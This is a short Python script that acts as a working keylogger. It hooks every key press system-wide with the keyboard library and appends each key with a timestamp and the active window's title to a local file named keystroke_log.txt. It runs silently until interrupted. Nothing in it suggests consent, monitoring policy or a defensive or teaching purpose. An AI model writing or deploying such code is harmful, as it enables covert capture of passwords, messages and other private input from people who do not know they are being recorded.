import datetime
import keyboard
import pygetwindow as gw

log_file = "keystroke_log.txt"

def get_active_window_title():
    active_window = gw.getActiveWindow()
    if active_window is not None:
        return active_window.title
    else:
        return "Unknown"

def on_press(event):
    # Get the active window title
    window_title = get_active_window_title()
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, 'a') as f:
        f.write(f"{timestamp}: {event.name} - {window_title}\n")

try:
    keyboard.on_press(on_press)
    keyboard.wait()
    
except KeyboardInterrupt:
    print("KeyboardInterrupt: Exiting program")
